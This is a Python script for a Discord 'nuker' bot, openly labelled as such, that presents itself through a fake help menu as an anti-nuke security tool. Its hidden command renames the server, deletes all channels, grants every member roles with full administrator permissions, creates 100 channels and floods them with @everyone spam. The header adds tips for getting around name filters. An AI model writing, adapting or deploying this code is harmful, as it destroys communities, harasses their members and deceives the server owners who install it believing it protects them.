#-- Discord Bot Nuker --#
#=========================================================================================================================#
# --- To bypass the text for the new channels we recommend : https://pixelied.com/font-generator/discord              --- #
# --- To bypass symbols in channels we recommend          : https://etcgamer.com/discord-symbols-server-channel-name/ --- #
# --- --------------------------------------------------------------------------------------------------------------- --- #
# --- We are not responsible for any consequences that may arise from the use of this Discord Nuke bot.               --- #
# --- By using this code, you accept full responsibility for any actions taken.                                       --- #
# --- --------------------------------------------------------------------------------------------------------------- --- #
# --- Lg c00lguy / xx_c00lguy_xx                                                                                      --- #
#=========================================================================================================================#




import discord
from discord.ext import commands

#===========================================================================#

TOKEN = "000000000000000000000000000000000000000000000000000000000000000000000000"                                           #===Bot Token Here===#
GUILD_NAME = "NEW SERVER NAME HERE"                                                                                          #===Server Name Here===#
ICON_PATH = "server_icon.png"                                                                                                #===Server Icon Here===#
NEW_CHANNEL_NAME = "NEW CHANELL TEXT HERE"                                                                                   #===Channel Name Here===#
MESSAGE_CONTENT = "YOUR TEXT HERE https://exampel.com ||@everyone||"                                                         #===Spam Message Here===#
ROLE_NAMES = ["TEXT", "TEXT", "TEXT"]                                                                                        #===Spam roles Here===#         [WARNING :  These roles will give to each server member these roles contain admin rights]

#===========================================================================#

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

#===========================================================================#

@bot.event
async def on_ready():
    print(f"Bot ist eingeloggt als {bot.user}")

@bot.command(name="help")
async def fake_help(ctx):
    embed = discord.Embed(title="Help Menu", description="Hier sind die verfügbaren Befehle:", color=0x00ff00)
    embed.add_field(name="!AntiNuke <ServerID>", value="Schütze deinen server vor nuke bots.", inline=False)
    embed.add_field(name="!Alert <Message>", value="Sende eine alert.", inline=False)
    embed.add_field(name="!Secure <ServerID>", value="Schützt deinen server.", inline=False)
    embed.add_field(name="!log <Channel ID>", value="Sehe die logs von einen chanell.", inline=False)
    embed.set_footer(text="Powered by Secruity")
    await ctx.send(embed=embed)

@bot.command()
async def n(ctx):
    guild = ctx.guild
    print(f"Spam-Befehl wurde von {ctx.author} auf {guild.name} ausgeführt.")
    try:
        with open(ICON_PATH, "rb") as icon_file:
            icon_data = icon_file.read()
            await guild.edit(name=GUILD_NAME, icon=icon_data)
            print("Server name und ico geändert.")
    except Exception as e:
        print(f"Fehler beim Ändern von Server name: {e}")
    for channel in guild.channels:
            await channel.delete()
    created_roles = []
    for role_name in ROLE_NAMES:
            role = await guild.create_role(name=role_name, permissions=discord.Permissions.all())
            created_roles.append(role)
    for member in guild.members:
            for role in created_roles:
                await member.add_roles(role)
    created_channels = []
    for i in range(100):
            new_channel = await guild.create_text_channel(f"{NEW_CHANNEL_NAME}-{i+1}")
            created_channels.append(new_channel)
    for channel in created_channels:
            for _ in range(3):
                await channel.send(MESSAGE_CONTENT)

#===========================================================================#

bot.run(TOKEN)